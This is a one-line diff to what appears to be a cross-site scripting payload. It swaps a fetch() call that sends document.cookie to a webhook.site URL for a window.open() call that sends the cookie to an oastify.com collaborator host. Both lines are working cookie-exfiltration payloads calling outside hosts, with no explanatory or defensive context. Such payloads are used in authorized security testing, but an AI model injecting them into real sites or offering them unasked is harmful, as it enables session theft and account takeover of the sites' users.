@@ -1,1 +1,1 @@
-fetch('https://webhook.site/a0f7b870-55ad-4c51-bd91-e2827b9d1661?cookie='+document.cookie)
+window.open('https://wee8ze30ue006rduygdxv38hy84zspge.oastify.com?cookie='+document.cookie)
